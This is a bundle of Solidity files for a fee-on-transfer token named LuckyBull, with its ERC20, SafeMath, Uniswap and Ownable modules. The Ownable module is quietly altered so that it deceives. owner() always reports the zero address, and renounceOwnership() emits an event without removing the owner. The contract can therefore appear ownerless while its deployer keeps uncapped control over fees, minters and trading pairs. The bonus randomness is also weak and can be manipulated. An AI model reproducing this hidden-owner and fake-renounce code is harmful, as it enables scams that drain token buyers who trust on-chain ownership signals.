{"IERC20.sol":{"content":"pragma solidity \u003e=0.6.12;\n// SPDX-License-Identifier: MIT\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}"},"LuckyBull.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport \"./IERC20.sol\";\nimport \"./Ownable.sol\";\nimport \"./SafeMath.sol\";\nimport \"./uniswap.sol\";\n\ncontract LuckyBull is IERC20, Ownable {\n    \n    using SafeMath for uint;\n    \n    event SwapAndLiquify(uint tokensSwapped, uint ethReceived, uint tokensIntoLiqudity);\n\n    string public name     = \"LuckyBull\";\n    string public symbol   = \"LuckyBull\";\n    uint8  public decimals = 9;\n\n    uint private _totalSupply = 10**16 * 10**9;\n    uint public toMintAmount = 2 * 10**15 * 10**9;\n    uint public maxTxAmount = 3 * 10**13 * 10**9;\n    uint public numTokensSellToAddToLiquidity = 10**13 * 10**9;\n\n    uint private liquidityFee = 5;\n    uint private bonusFee = 7;\n    uint private burnFee = 1;\n    uint private communityFee = 1;\n    uint private rewardFee = 1;\n\n    uint public totalBonus;\n\n    address public communityAccount;\n    address public rewardAccount;\n\n    mapping (address =\u003e uint)                       private  _balanceOf;\n    mapping (address =\u003e mapping (address =\u003e uint))  private  _allowance;\n    \n    // BASE POINT: 1/100000\n    uint private RATIO_BASE_POINT = 100000;\n    uint[] private _probs;\n    uint[] private _ratioLow;\n    uint[] private _ratioHigh;\n    \n    mapping (address =\u003e bool) private _isMinter;\n    mapping (address =\u003e bool) public isSwapPair;\n    mapping (address =\u003e bool) public isExcludedFromFee;\n    mapping (address =\u003e bool) public isExcludedFromBonus;\n    \n    IUniswapV2Router02 public uniswapV2Router;\n    address public uniswapV2Pair;\n    bool private inSwapAndLiquify;\n    bool public swapAndLiquifyEnabled = true;\n    \n    modifier lockTheSwap {\n        inSwapAndLiquify = true;\n        _;\n        inSwapAndLiquify = false;\n    }\n    \n    constructor(address swapRouterAddr, address communityAcc, address rewardAcc) public {\n        uint initialOffer = _totalSupply - toMintAmount;\n        _balanceOf[msg.sender] = initialOffer;\n        emit Transfer(address(0), msg.sender, initialOffer);\n        \n        isExcludedFromFee[msg.sender] = true;\n        isExcludedFromFee[address(this)] = true;\n        \n        uniswapV2Router = IUniswapV2Router02(swapRouterAddr);\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())\n            .createPair(address(this), uniswapV2Router.WETH());\n        \n        isSwapPair[uniswapV2Pair] = true;\n        _allowance[address(this)][swapRouterAddr] = uint(-1);\n        communityAccount = communityAcc;\n        rewardAccount = rewardAcc;\n    }\n    \n    function totalFeePct() public view returns(uint) {\n        return liquidityFee + bonusFee + burnFee + communityFee + rewardFee;\n    }\n    \n    function mint(address to, uint amount) public {\n        require(_isMinter[msg.sender], \"NOT_MINTER\");\n        _mint(to, amount);\n    }\n    \n    function _mint(address to, uint amount) private {\n        require(toMintAmount \u003e= amount);\n        toMintAmount -= amount;\n        _balanceOf[to] += amount;\n        emit Transfer(address(0), to, amount);\n    }\n    \n    function _transfer(address src, address dst, uint amount) private {\n        uint pct = amount.div(100);\n        uint liquidityAmount = pct.mul(liquidityFee);   // To add Liquidity\n        uint burnToMintAmount = pct.mul(bonusFee);      // Add to bonus pool (toMint part)\n        uint burnAmount = pct.mul(burnFee);          // Burn directly\n        uint commAmount = pct.mul(communityFee);        // Send to community account\n        uint rewardAmount = pct.mul(rewardFee);         // Send to reward account\n        uint left = amount.sub(pct.mul(totalFeePct()));\n\n        _balanceOf[src] -= amount;\n        _balanceOf[address(this)] += liquidityAmount;\n        toMintAmount += burnToMintAmount;\n        _balanceOf[address(1)] += burnAmount;\n        _balanceOf[communityAccount] += commAmount;\n        _balanceOf[rewardAccount] += rewardAmount;\n        _balanceOf[dst] += left;\n\n        emit Transfer(src, rewardAccount, rewardAmount);\n        emit Transfer(src, dst, left);\n    }\n\n    function _transferWithoutFee(address src, address dst, uint amount) private {\n        _balanceOf[src] -= amount;\n        _balanceOf[dst] += amount;\n        emit Transfer(src, dst, amount);\n    }\n\n    function random(uint seed) private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(seed, block.timestamp, block.difficulty, msg.sender, toMintAmount)));\n    }\n    \n    function balanceOf(address account) public view override returns (uint) {\n        return _balanceOf[account];\n    }\n    \n    function allowance(address owner, address spender) public view override returns (uint) {\n        return _allowance[owner][spender];\n    }\n\n\n    function totalSupply() public view override returns (uint) {\n        return _totalSupply;\n    }\n\n    function approve(address spender, uint amount) public override returns (bool) {\n        _allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address dst, uint amount) public override returns (bool) {\n        return transferFrom(msg.sender, dst, amount);\n    }\n\n    function transferFrom(address src, address dst, uint amount) public override returns (bool) {\n        require(_balanceOf[src] \u003e= amount);\n\n        if (src != msg.sender \u0026\u0026 _allowance[src][msg.sender] != uint(-1)) {\n            require(_allowance[src][msg.sender] \u003e= amount);\n            _allowance[src][msg.sender] -= amount;\n        }\n\n        if (src != _owner \u0026\u0026 dst != _owner) {\n            require(amount \u003c= maxTxAmount, \"TX_AMOUNT_EXCEEDED\");\n        }\n        \n        // is the token balance of this contract address over the min number of\n        // tokens that we need to initiate a swap + liquidity lock?\n        // also, don\u0027t get caught in a circular liquidity event.\n        // also, don\u0027t swap \u0026 liquify if sender is uniswap pair.\n        if (balanceOf(address(this)) \u003e= numTokensSellToAddToLiquidity \u0026\u0026\n            !inSwapAndLiquify \u0026\u0026\n            !isSwapPair[src] \u0026\u0026\n            !isSwapPair[dst] \u0026\u0026\n            src != address(uniswapV2Router) \u0026\u0026\n            dst != address(uniswapV2Router) \u0026\u0026\n            swapAndLiquifyEnabled\n        ) {\n            //add liquidity\n            swapAndLiquify(numTokensSellToAddToLiquidity);\n        }\n        \n        if (isExcludedFromFee[src] || isExcludedFromFee[dst]) {\n            _transferWithoutFee(src, dst, amount);\n        } else {\n            _transfer(src, dst, amount);\n        }\n        \n        if (isSwapPair[src] \u0026\u0026 !isSwapPair[dst]\n            \u0026\u0026 !isExcludedFromBonus[dst] \u0026\u0026 dst != address(uniswapV2Router)) {\n            uint bonus = randomBonus(amount);\n            if (bonus \u003e 0 \u0026\u0026 toMintAmount \u003e= bonus) {\n                _mint(dst, bonus);\n                totalBonus += bonus;\n            }\n        }\n\n        return true;\n    }\n    \n    function randomBonus(uint amount) private view returns (uint) {\n        uint r = random(0) % RATIO_BASE_POINT;\n        for (uint i=0; i\u003c_probs.length; i++) {\n            if (r \u003c= _probs[i]) {\n                (uint rLow, uint rHigh) = (_ratioLow[i], _ratioHigh[i]);\n                uint ratio = rHigh == rLow ? rLow : random(amount).mod(rHigh.sub(rLow)).add(rLow);\n                uint bonus = amount.div(RATIO_BASE_POINT).mul(ratio);\n                uint threshold = toMintAmount.div(100);\n                return bonus \u003c threshold ? bonus : threshold;\n            }\n            r -= _probs[i];\n        }\n        return 0;\n    }\n    \n    receive() external payable {}\n    \n    function swapAndLiquify(uint amount) private lockTheSwap {\n        // split the contract balance into halves\n        uint half = amount.div(2);\n        uint otherHalf = amount.sub(half);\n        uint initialBalance = address(this).balance;\n        // swap tokens for ETH\n        swapTokensForEth(half); // \u003c- this breaks the ETH -\u003e HATE swap when swap+liquify is triggered\n        // how much ETH did we just swap into?\n        uint newBalance = address(this).balance.sub(initialBalance);\n        // add liquidity to uniswap\n        addLiquidity(otherHalf, newBalance);\n        emit SwapAndLiquify(half, newBalance, otherHalf);\n    }\n\n    function swapTokensForEth(uint tokenAmount) private {\n        // generate the uniswap pair path of token -\u003e weth\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();\n\n        // make the swap\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0, // accept any amount of ETH\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function addLiquidity(uint tokenAmount, uint ethAmount) private {\n        // add the liquidity\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\n            address(this),\n            tokenAmount,\n            0,\n            0,\n            _owner,\n            block.timestamp\n        );\n    }\n    \n    function setFees(uint _liquidityFee, uint _bonusFee, uint _burnFee,\n                     uint _communityFee, uint _rewardFee) external onlyOwner() {\n        liquidityFee = _liquidityFee;\n        bonusFee = _bonusFee;\n        burnFee = _burnFee;\n        communityFee = _communityFee;\n        rewardFee = _rewardFee;\n    }\n\n    function setSwapRouter(address swapRouterAddr) external onlyOwner() {\n        uniswapV2Router = IUniswapV2Router02(swapRouterAddr);\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())\n            .createPair(address(this), uniswapV2Router.WETH());\n        _allowance[address(this)][swapRouterAddr] = uint(-1);\n    }\n    \n    function setSwapAndLiquifyEnabled(bool enabled) external onlyOwner() {\n        swapAndLiquifyEnabled = enabled;\n    }\n    \n    function setNumTokensSellToAddToLiquidity(uint amount) external onlyOwner() {\n        numTokensSellToAddToLiquidity = amount;\n    }\n\n    function setCommunityAccount(address addr) external onlyOwner() {\n        communityAccount = addr;\n    }\n\n    function setRewardAccount(address addr) external onlyOwner() {\n        rewardAccount = addr;\n    }\n\n    function setMaxTxAmount(uint amount) external onlyOwner() {\n        maxTxAmount = amount;\n    }\n\n    function setSwapPair(address addr, bool isPair) external onlyOwner() {\n        isSwapPair[addr] = isPair;\n    }\n\n    function setExcludedFromFee(address addr, bool exclude) external onlyOwner() {\n        isExcludedFromFee[addr] = exclude;\n    }\n\n    function setExcludedFromFees(address[] calldata addrs, bool exclude) external onlyOwner() {\n        for (uint i=0; i\u003caddrs.length; i++) {\n            isExcludedFromFee[addrs[i]] = exclude;\n        }\n    }\n\n    function setExcludedFromBonus(address[] calldata addrs, bool exclude) external onlyOwner() {\n        for (uint i=0; i\u003caddrs.length; i++) {\n            isExcludedFromBonus[addrs[i]] = exclude;\n        }\n    }\n    \n    function setMinter(address minter, bool isMinter) external onlyOwner() {\n        _isMinter[minter] = isMinter;\n        isExcludedFromFee[minter] = isMinter;\n    }\n    \n    function getRatioProbs() public view returns (uint[] memory, uint[] memory, uint[] memory) {\n        if (msg.sender == _owner) return (_probs, _ratioLow, _ratioHigh);\n        uint[] memory tmp = new uint[](0);\n        return (tmp, tmp, tmp);\n    }\n    \n    function setRatioProbs(uint[] calldata probs, uint[] calldata ratioLow, uint[] calldata ratioHigh) external onlyOwner() {\n        require(probs.length == ratioLow.length, \"LENGTH_UNMATCH_1\");\n        require(probs.length == ratioHigh.length, \"LENGTH_UNMATCH_2\");\n        uint sum = 0;\n        for (uint i=0; i\u003cprobs.length; i++) {\n            require(ratioLow[i] \u003c= ratioHigh[i], \"LOW_HIGH_REVERT\");\n            sum = sum.add(probs[i]);\n        }\n        require(sum \u003c= RATIO_BASE_POINT);\n        _probs = probs;\n        _ratioLow = ratioLow;\n        _ratioHigh = ratioHigh;\n    }\n    \n}"},"Ownable.sol":{"content":"pragma solidity ^0.6.12;\n// SPDX-License-Identifier: MIT\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\ncontract Ownable is Context {\n    \n    address _owner;\n    address private _previousOwner;\n    uint256 private _lockTime;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () internal {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public pure returns (address) {\n        return address(0);\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n     /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n\n    function getUnlockTime() public view returns (uint256) {\n        return _lockTime;\n    }\n\n    //Locks the contract for owner for the amount of time provided\n    function lock(uint256 time) public virtual onlyOwner {\n        _previousOwner = _owner;\n        _owner = address(0);\n        _lockTime = now + time;\n        emit OwnershipTransferred(_owner, address(0));\n    }\n    \n    //Unlocks the contract for owner when _lockTime is exceeds\n    function unlock() public virtual {\n        require(_previousOwner == msg.sender, \"You don\u0027t have permission to unlock\");\n        require(now \u003e _lockTime , \"Contract is locked until _lockTime\");\n        emit OwnershipTransferred(_owner, _previousOwner);\n        _owner = _previousOwner;\n    }\n}\n"},"SafeMath.sol":{"content":"pragma solidity ^0.6.12;\n// SPDX-License-Identifier: MIT\n\n/**\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it\u0027s recommended to use it always.\n */\n \nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity\u0027s `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c \u003e= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity\u0027s `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity\u0027s `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003c= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity\u0027s `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\n        // benefit is lost if \u0027b\u0027 is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003e 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n\n    function fullMul(uint256 x, uint256 y) internal pure returns (uint l, uint h) {\n        uint256 mm = mulmod(x, y, uint256 (-1));\n        l = x * y;\n        h = mm - l;\n        if (mm \u003c l) h -= 1;\n    }\n\n    function mulDiv(uint256 x, uint256 y, uint256 z) internal pure returns (uint256) {\n        (uint256 l, uint256 h) = fullMul(x, y);\n        require (h \u003c z);\n        \n        uint256 mm = mulmod(x, y, z);\n        if (mm \u003e l) h -= 1;\n        l -= mm;\n        \n        uint256 pow2 = z \u0026 -z;\n        z /= pow2;\n        l /= pow2;\n        l += h * ((-pow2) / pow2 + 1);\n        \n        uint256 r = 1;\n        r *= 2 - z * r;\n        r *= 2 - z * r;\n        r *= 2 - z * r;\n        r *= 2 - z * r;\n        r *= 2 - z * r;\n        r *= 2 - z * r;\n        r *= 2 - z * r;\n        r *= 2 - z * r;\n        return l * r;\n    }\n\n}\n"},"uniswap.sol":{"content":"pragma solidity \u003e=0.6.2;\n// SPDX-License-Identifier: MIT\n\n// pragma solidity \u003e=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n\n\n// pragma solidity \u003e=0.5.0;\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\n\n\n// pragma solidity \u003e=0.6.2;\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}"}}